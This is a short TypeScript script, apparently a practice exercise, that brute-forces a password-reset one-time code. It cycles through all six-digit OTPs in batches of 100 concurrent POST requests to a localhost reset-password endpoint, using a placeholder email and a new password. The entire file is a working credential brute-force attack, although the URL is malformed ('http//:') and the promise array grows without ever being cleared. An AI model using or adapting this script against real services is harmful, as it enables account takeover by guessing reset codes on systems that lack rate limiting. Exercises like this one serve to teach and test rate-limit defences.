const promises:Promise<void>[] = [];

async function sendRequest(otp:number) {
    await fetch("http//:localhost:3000/reset-password", {
        method: "POST",
        body: JSON.stringify({
          email: "habeel#dsf",
          otp: otp,
          newPassword: "sdafsdf",
        }),
      });
}
async function main(){
    // batching promises
    for (let i = 100000; i < 1000000; i+=100) {
        for(let j = 0; j<100;j++){
            // sendRequest returns a promise pending as it is an async function
            // we are not awaiting it as we need to send 100 together and after that await for all 100 to complete
            promises.push(sendRequest(i+j));
        }
        // we are awaiting all 100 after all promise is complete we move to next 100
        await Promise.all(promises);
        
      }
}


main();
